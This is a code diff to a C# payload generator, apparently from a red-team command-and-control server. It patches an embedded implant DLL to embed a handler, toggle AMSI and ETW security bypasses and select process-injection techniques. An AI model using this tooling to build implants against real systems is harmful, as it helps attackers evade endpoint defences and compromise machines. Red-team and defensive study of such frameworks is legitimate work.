@@ -11,22 +11,32 @@ namespace TeamServer.Models
 {
     public abstract class Payload
     {
-        public Handler Handler { get; set; }
+        protected C2Profile C2Profile { get; }
+        public Handler Handler { get; }
         public byte[] Bytes { get; protected set; }
+
+        protected Payload(Handler handler, C2Profile c2Profile)
+        {
+            Handler = handler;
+            C2Profile = c2Profile;
+        }
 
         public abstract Task Generate();
 
         protected async Task<ModuleDefMD> GetDroneModuleDef()
         {
             var drone = await Utilities.GetEmbeddedResource("drone.dll");
-            
             var module = ModuleDefMD.Load(drone);
-            module = EmbedHandler(module);
+            
+            EmbedHandler(module);
+            SetAppDomainName(module);
+            SetBypasses(module);
+            SetProcessInjectionOptions(module);
 
             return module;
         }
 
-        private ModuleDefMD EmbedHandler(ModuleDefMD module)
+        private void EmbedHandler(ModuleDef module)
         {
             // get handlers (not including the abstract)
             var handlers = module.Types
@@ -73,8 +83,57 @@ namespace TeamServer.Models
             var droneType = module.Types.GetType("Drone");
             var getHandler = droneType.Methods.GetMethod("get_GetHandler");
             getHandler.Body.Instructions[0].Operand = targetHandler.Methods.GetConstructor();
+        }
 
-            return module;
+        private void SetAppDomainName(ModuleDef module)
+        {
+            var type = module.Types.GetType("SharpSploit.Execution.Assembly");
+            var method = type.Methods.GetMethod("AppDomainName");
+            method.Body.Instructions[0].Operand = C2Profile.PostExploitation.AppDomain;
+        }
+
+        private void SetBypasses(ModuleDef module)
+        {
+            var utils = module.Types.GetType("Utilities");
+
+            var getBypassAmsi = utils.Methods.GetMethod("GetBypassAmsi");
+            SetBypassAmsi(getBypassAmsi);
+            
+            var getBypassEtw = utils.Methods.GetMethod("GetBypassEtw");
+            SetBypassEtw(getBypassEtw);
+        }
+
+        private void SetProcessInjectionOptions(ModuleDef module)
+        {
+            var utils = module.Types.GetType("Utilities");
+
+            // allocation
+            var getAllocationTech = utils.Methods.GetMethod("GetAllocationTechnique");
+            var alloc = module.Types.GetType(C2Profile.ProcessInjection.Allocation);
+            getAllocationTech.Body.Instructions[0].Operand = alloc;
+            
+            // execution
+            var getExecutionTech = utils.Methods.GetMethod("GetExecutionTechnique");
+            var exec = module.Types.GetType(C2Profile.ProcessInjection.Execution);
+            getExecutionTech.Body.Instructions[0].Operand = exec;
+        }
+
+        private void SetBypassAmsi(MethodDef method)
+        {
+            var instruction = method.Body.Instructions[0];
+
+            instruction.OpCode = C2Profile.PostExploitation.BypassAmsi
+                ? OpCodes.Ldc_I4_1
+                : OpCodes.Ldc_I4_0;
+        }
+        
+        private void SetBypassEtw(MethodDef method)
+        {
+            var instruction = method.Body.Instructions[0];
+
+            instruction.OpCode = C2Profile.PostExploitation.BypassEtw
+                ? OpCodes.Ldc_I4_1
+                : OpCodes.Ldc_I4_0;
         }
     }
 }
